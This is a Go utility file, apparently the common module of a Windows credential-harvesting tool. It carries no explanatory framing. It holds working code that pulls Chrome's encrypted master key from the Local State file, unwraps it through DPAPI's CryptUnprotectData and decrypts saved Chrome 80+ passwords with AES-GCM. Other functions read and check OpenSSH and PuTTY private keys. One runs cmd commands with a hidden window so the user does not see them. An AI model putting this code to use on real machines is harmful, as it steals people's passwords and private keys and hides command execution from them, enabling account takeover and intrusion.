package common

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/pem"
	"github.com/aglyzov/charmap"
	"github.com/tidwall/gjson"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"unsafe"
)

var (
	// Contain home directory of current user
	UserHome = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")

	// Contain path to %APPDATA% directory
	AppData = os.Getenv("APPDATA")

	// Contain path to %LOCALAPPDATA% directory
	LocalAppData = os.Getenv("LOCALAPPDATA")
)

// Structure for extracted credentials that contains a target url, login and password
type UrlNamePass struct {
	Url      string
	Username string
	Pass     string
	//From    string
}

// Structure for extracted credentials that contains only a login and password
type NamePass struct {
	Name string
	Pass string
}

// Structure for extracted credentials that contains status flag and data array
type ExtractCredentialsResult struct {
	Success bool
	Data    []UrlNamePass
	//Command []string
}

// Structure for extracted credentials that contains status flag and data array
type ExtractCredentialsNamePass struct {
	Success bool
	Data    []NamePass
}

// Simple function for copying files
func CopyFile(src string, dst string) error {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, data, 0644)
	if err != nil {
		return err
	}
	return nil
}

// WinAPI data blob structure
type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

var EmptyResult = ExtractCredentialsResult{false, nil}

/*
	Start WinAPI decrypt function
*/

// Transform WinApi data blob to byte array
func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

// Function for decrypting data that has been encrypted with CryptProtectData from win cryptapi
func Win32CryptUnprotectData(cipherText string, entropy bool) ([]byte, error) {
	var (
		dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
		dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

		procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
		procLocalFree   = dllkernel32.NewProc("LocalFree")
	)

	var outblob DATA_BLOB
	var inblob = NewBlob([]byte(cipherText))

	checkExist, _, errProcDecryptData := procDecryptData.Call(
		uintptr(unsafe.Pointer(inblob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outblob)))

	if checkExist == 0 {
		return nil, errProcDecryptData
	}

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.ToByteArray(), nil
}

/*
	End WinAPI decrypt function
*/

// Get AES master key with which passwords will be decrypted later
// master key is used in DecryptAESPwd
func GetMasterkey(keyFilePath string) ([]byte, error) {
	res, _ := ioutil.ReadFile(keyFilePath)
	keyEncrypted, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
	if err != nil {
		return []byte{}, err
	}
	keyEncrypted = keyEncrypted[5:]
	masterKey, err := Win32CryptUnprotectData(string(keyEncrypted), false)
	if err != nil {
		return []byte{}, err
	}
	return masterKey, nil
}

// Decrypt Chrome v. 80+ password
func DecryptAESPwd(pwd, masterKey []byte) ([]byte, error) {
	nonce := pwd[3:15]
	cryptoBlock := pwd[15:]
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return nil, err
	}
	blockMode, _ := cipher.NewGCM(block)
	decryptedData, err := blockMode.Open(nil, nonce, cryptoBlock, nil)
	if err != nil {
		return nil, err
	}
	return decryptedData, nil
}

// Check key for RFC 1421 compliance.
func OpensshKeyCheck(key []byte) bool {
	//block - pem encoded data
	block, _ := pem.Decode(key)
	if block == nil {
		return false
	}
	_, err := ssh.ParsePrivateKey(key)
	if err != nil {
		return false
	} else {
		return true
	}
}

// Ugly function for putty key format checking
func PpkKeyCheck(key []byte) bool {
	pattern := `Private-Lines: \d+`
	match, err := regexp.MatchString(pattern, string(key))
	if err != nil {
		return false //, fmt.Errorf("Error matching: ")
	}
	if match {
		return true
	} else {
		return false
	}
}

// Read key from file and return him
func ReadKey(keyPath string) []byte {
	f, err := os.Open(keyPath)
	if err != nil {
		return nil
	}
	defer f.Close()
	stat, err := f.Stat()
	if err != nil {
		return nil
	}
	size := int(stat.Size())
	//error opening file
	key := make([]byte, size)
	_, err = f.Read(key)
	//error reading file
	if err != nil {
		log.Println("Error reading file: ", err)
		return nil
	}
	return key
}

// Silent cmd exec. When using this function, the user will not see the CMD window
func ExecCommand(command string, params []string) string {

	paramsWithSilentExec := append([]string{"/Q", "/C"}, params...)

	cmd_li := exec.Command(command, paramsWithSilentExec...)

	cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //run CMD in hidden mode

	output, _ := cmd_li.Output()
	if output != nil && len(output) > 0 {
		output = charmap.CP866_to_UTF8(output)
	}
	return string(output)
}
